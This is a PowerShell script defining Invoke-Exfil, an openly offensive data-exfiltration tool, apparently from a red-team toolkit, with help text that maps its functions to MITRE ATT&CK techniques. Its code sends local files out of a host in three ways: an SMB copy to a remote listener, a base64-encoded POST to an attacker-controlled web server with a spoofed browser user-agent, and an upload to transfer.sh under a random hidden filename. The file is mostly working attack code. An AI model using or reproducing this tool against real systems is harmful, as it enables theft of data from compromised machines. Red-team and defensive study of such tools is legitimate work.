function Invoke-Exfil {
[CmdletBinding()]
param (
	[Switch]$Help,
	[switch]$List,
	[Switch]$SmbExfil,
	[String]$SmbIp,
	[String]$LocalFile,
	[Switch]$RestExfil,
	[String]$LocalFile2=[String]$Localfile,
	[String]$Url,
	[Switch]$TransferShExfil,
	[String]$LocalFile3=[String]$LocalFIle
)

	if ($Help -eq $True) {
		Write @"
		
 ### Invoke-Exfil Help ###
 -------------------------
 Available Invoke-Exfil Commands:
 --------------------------------
 |-----------------------------------------------------------------------------|
 | -SmbExfil [-LocalFile] local_file [-SmbIp] smb_ip                           |
 |-----------------------------------------------------------------------------|
                                                                                
   [*] Description: Copies a local file over SMB to a remote SMB                
       Listener.                                                                
                                                                                
   [*] Usage: Invoke-Exfil -SmbExfil -LocalFile C:\temp\data.txt -SmbIp n.n.n.n 
   [*] Use impacket-smbserver on remote:                                                  
       impacket-smbserver data /tmp/data -smb2support 
	   
   [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
   [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)   
 
 |-----------------------------------------------------------------------------|
 | -RestExfil [-LocalFile] local_file [-Url] remote_server                     |
 |-----------------------------------------------------------------------------|
 
   [*] Description: Uses PowerShell's "Invoke-RestMethod" "POST" to encode and 
       send a file to an attacker-controlled web server.
	
   [*] Usage: Invoke-Exfil -RestExfil -LocalFile C:\file -Url https://srv/exfil
   
   [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
   [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)
   
 |-----------------------------------------------------------------------------|
 | -TransferShExfil [-LocalFile] local_file                                    |
 |-----------------------------------------------------------------------------|
 
   [*] Description: Uploads a file to the https://transfer.sh file upload 
       service. A URL to the file will be returned and is valid for 14 days. 
       "Invoke-WebRequest" and PUT is utilized for this function.
	
   [*] Usage: Invoke-Exfil -TransferShExfil -LocalFile C:\file
   
   [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
   [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)
	   
 |-----------------------------------------------------------------------------|

"@
	}
	elseif ($List -eq $True) {
		Write @"  

 Invoke-Exfil Command List:
 --------------------------
 Invoke-Exfil -SmbExfil [-LocalFile] local_file [-SmbIp] smb_ip
 Invoke-Exfil -RestExfil [-LocalFile] local_file [-Url] remote_server
 Invoke-Exfil -TransferShExfil [-LocalFile] local_file

"@
	}

	elseif ($SmbExfil -and $SmbIp -and $LocalFile) {
		(Copy-Item -Path $LocalFile -Destination \\$SmbIp\data\)
	}
	elseif ($RestExfil -and $LocalFile -and $Url) {
	
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write " [!] This function requires PowerShell version greater than 2.0."
			return
		}
		else {
			$Data = Get-Content $LocalFile
			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
			$EncodedData = [Convert]::ToBase64String($Bytes)
			
			$Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
			$Headers.Add("USER-AGENT", 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko')
			
			$Request = Invoke-RestMethod $Url -Method Post -Body $EncodedData -Headers $Headers
		}
	}
	elseif ($TransferShExfil -and $LocalFIle) {
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write " [!] This function requires PowerShell version greater than 2.0."
			return
		}
		else {
			$FileName = '.'+(-join ((65..90) + (97..122) | Get-Random -Count 32 | foreach {[char]$_}))
				
			$Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
			$Headers.Add("USER-AGENT", 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko')
			
			$Request = (Invoke-WebRequest -Method Put -infile $LocalFile -Headers $Headers https://transfer.sh/$FileName)
			
			Write " `n[+] Link to file; valid for 14 days --> $Request `n"
		}
	}
}
